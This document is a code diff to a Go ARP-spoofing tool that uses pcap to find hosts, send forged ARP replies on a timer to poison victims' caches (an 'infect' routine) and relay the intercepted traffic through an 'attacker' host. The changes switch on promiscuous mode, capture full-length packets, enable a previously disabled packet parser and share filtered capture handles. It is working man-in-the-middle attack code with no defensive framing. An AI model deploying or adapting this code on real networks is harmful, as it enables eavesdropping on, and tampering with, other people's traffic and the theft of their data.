@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"log"
+	"math"
 	"net"
 	"os"
 	"strconv"
@@ -34,8 +35,8 @@ type Session struct {
 }
 
 var (
-	snapshotLen = int32(1024)
-	promiscuous = false
+	snapshotLen = int32(math.MaxInt32)
+	promiscuous = true
 	timeout     = time.Minute
 
 	options gopacket.SerializeOptions
@@ -52,12 +53,13 @@ func main() {
 	attacker := &Host{}
 	attacker.getLocalhostInfomation(device)
 
-	// go parse(device)
+	go parse(device)
 
+	handle := openPcap(device, "ip")
 	for session := range attacker.getSessionChan() {
 		log.Println("Session Detected.", session)
-		go session.infect(attacker)
-		go session.relay(attacker)
+		go session.infect(handle, attacker)
+		go session.relay(handle, attacker)
 	}
 }
 
@@ -80,10 +82,14 @@ func selectDeviceFromUser() pcap.Interface {
 	return devices[selected-1]
 }
 
-func openPcap(device pcap.Interface) *pcap.Handle {
+func openPcap(device pcap.Interface, filter string) *pcap.Handle {
 	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
 	if err != nil {
 		os.Exit(1)
+	}
+	err = handle.SetBPFFilter(filter)
+	if err != nil {
+		log.Fatal(err)
 	}
 	return handle
 }
@@ -148,16 +154,15 @@ func (h *Host) getSessionChan() (ch chan *Session) {
 	}
 
 	hostInNetwork = hostInNetwork[1 : len(hostInNetwork)-1]
-	go recvARP(hostInNetwork, ch)
-	go h.infinitySendARP(hostInNetwork)
+
+	handle := openPcap(device, "arp")
+	go recvARP(handle, hostInNetwork, ch)
+	go h.infinitySendARP(handle, hostInNetwork)
 
 	return
 }
 
-func (h *Host) infinitySendARP(IPs []net.IP) {
-	handle := openPcap(device)
-	defer handle.Close()
-
+func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
 	for len(IPs) > 0 {
 		for _, IP := range IPs {
 			sendARP(handle, &AddressPair{
@@ -199,16 +204,13 @@ func (h *Host) infinitySendARP(IPs []net.IP) {
 // 	}
 // }
 
-func (s *Session) infect(attacker *Host) {
-	handle := openPcap(device)
-	defer handle.Close()
-
-	ticker1sec := time.Tick(time.Second * 1)
+func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
+	ticker3sec := time.Tick(time.Second * 3)
 	// ticker3min := time.Tick(time.Minute * 3)
 	log.Println("Infection Start.", s)
 	for {
 		select {
-		case <-ticker1sec:
+		case <-ticker3sec:
 			sendARP(handle, &AddressPair{
 				DstProtAddress: s.Sender.IP,
 				DstHwAddress:   s.Sender.MAC,
@@ -229,12 +231,17 @@ func (s *Session) infect(attacker *Host) {
 	}
 }
 
-func (s *Session) relay(attacker *Host) {
-	handle := openPcap(device)
-	defer handle.Close()
+func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
+	// if ring, err := pfring.NewRing(device, 65536, pfring.FlagPromisc); err != nil {
+	// 	panic(err)
+	// } else if err := ring.SetBPFFilter("ip"); err != nil {
+	// 	panic(err)
+	// } else if err := ring.Enable(); err != nil {
+	// 	panic(err)
+	// }
+	// packetSource := gopacket.NewPacketSource(ring, layers.LinkTypeEthernet)
 
 	var eth layers.Ethernet
-
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
 		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth)
@@ -270,11 +277,7 @@ func (s *Session) relay(attacker *Host) {
 	}
 }
 
-func recvARP(IPs []net.IP, ch chan *Session) {
-	handle := openPcap(device)
-	defer handle.Close()
-
-	defer close(ch)
+func recvARP(handle *pcap.Handle, IPs []net.IP, ch chan *Session) {
 	gateway := &Host{IP: IPs[0]}
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
@@ -298,7 +301,6 @@ func recvARP(IPs []net.IP, ch chan *Session) {
 
 	var eth layers.Ethernet
 	var arp layers.ARP
-
 	for packet := range packetSource.Packets() {
 		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
 			&eth, &arp)
@@ -355,7 +357,7 @@ func sendARP(handle *pcap.Handle, addressPair *AddressPair, operation uint16) {
 }
 
 func (s *Session) String() string {
-	return fmt.Sprint(s.Sender.String(), " <-> ", s.Receiver.String())
+	return fmt.Sprint(s.Sender.String())
 }
 
 func (h *Host) String() string {
